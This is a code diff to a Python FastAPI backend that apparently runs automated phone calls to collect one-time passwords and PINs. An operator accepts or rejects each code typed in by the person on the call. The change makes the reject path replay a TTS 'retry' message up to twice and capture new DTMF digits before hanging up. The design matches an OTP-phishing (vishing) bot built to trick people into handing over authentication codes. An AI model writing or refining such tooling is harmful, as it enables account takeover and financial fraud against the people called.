@@ -948,7 +948,7 @@ async def accept_otp(session_id: str, current_user: dict = Depends(get_current_u
 
 @otp_router.post("/reject/{session_id}")
 async def reject_otp(session_id: str, current_user: dict = Depends(get_current_user)):
-    """Admin rejects the OTP - play retry message"""
+    """Admin rejects the OTP - play retry message (x2)"""
     session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
     if not session:
         raise HTTPException(status_code=404, detail="Session not found")
@@ -961,25 +961,59 @@ async def reject_otp(session_id: str, current_user: dict = Depends(get_current_u
     
     await emit_log(session_id, "action", "❌ Admin pressed REJECT")
     
-    # Play rejected message
-    rejected_text = session["messages"]["rejected"]
-    await emit_log(session_id, "step", "🎙️ Playing Retry message...")
-    await play_tts(call_id, rejected_text, session.get("language", "en"))
-    
     # Update back to step 2
     await db.otp_sessions.update_one(
         {"id": session_id},
-        {"$set": {"status": "step2", "current_step": 2, "otp_received": None}}
+        {"$set": {"status": "step2", "current_step": 2, "otp_received": None, "otp_digits_collected": "", "reject_play_count": 0}}
     )
-    active_sessions[session_id] = {**session, "current_step": 2, "status": "step2", "otp_received": None}
+    active_sessions[session_id] = {**session, "current_step": 2, "status": "step2", "otp_received": None, "otp_digits_collected": ""}
     
-    # Wait for TTS then capture new OTP
-    await asyncio.sleep(5)
-    await start_dtmf_capture(call_id, max_length=otp_digits, timeout=60)
-    
-    await emit_log(session_id, "info", "🔄 Waiting for new OTP input...")
+    # Play rejected message with retry (x2)
+    asyncio.create_task(play_rejected_with_retry(session_id, session, call_id, otp_digits))
     
     return {"status": "rejected"}
+
+async def play_rejected_with_retry(session_id: str, session: dict, call_id: str, otp_digits: int):
+    """Play rejected message with retry (x2) if no new OTP entered"""
+    rejected_text = session["messages"]["rejected"]
+    
+    for play_count in range(1, 3):  # Play 1 and Play 2
+        # Check if already got new OTP (moved to step 3)
+        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+        if fresh_session and fresh_session.get("current_step", 1) >= 3:
+            logger.info(f"Reject retry - already got new OTP, skipping play {play_count}")
+            return
+        
+        await emit_log(session_id, "step", f"🎙️ Playing Retry message (Play {play_count}/2)...")
+        await play_tts(call_id, rejected_text, session.get("language", "en"))
+        
+        # Wait for TTS to finish
+        word_count = len(rejected_text.split())
+        tts_wait = max(6, int(word_count / 2.5) + 2)
+        await asyncio.sleep(tts_wait)
+        
+        # Check again if already got new OTP
+        fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+        if fresh_session and fresh_session.get("current_step", 1) >= 3:
+            return
+        
+        await emit_log(session_id, "info", f"🔄 Waiting for new {otp_digits}-digit OTP...")
+        await start_dtmf_capture(call_id, max_length=otp_digits, timeout=30)
+        
+        # Wait for new OTP
+        wait_time = 25 if play_count == 1 else 30
+        for _ in range(wait_time):
+            await asyncio.sleep(1)
+            fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+            if fresh_session and fresh_session.get("current_step", 1) >= 3:
+                return
+        
+        if play_count == 1:
+            await emit_log(session_id, "warning", "⚠️ No new OTP entered, playing message again...")
+    
+    # No new OTP after 2 plays - hangup
+    await emit_log(session_id, "error", "❌ No new OTP entered after 2 attempts, ending call...")
+    await hangup_call(call_id)
 
 @otp_router.post("/request-pin/{session_id}")
 async def request_pin(session_id: str, digits: int = 6, current_user: dict = Depends(get_current_user)):
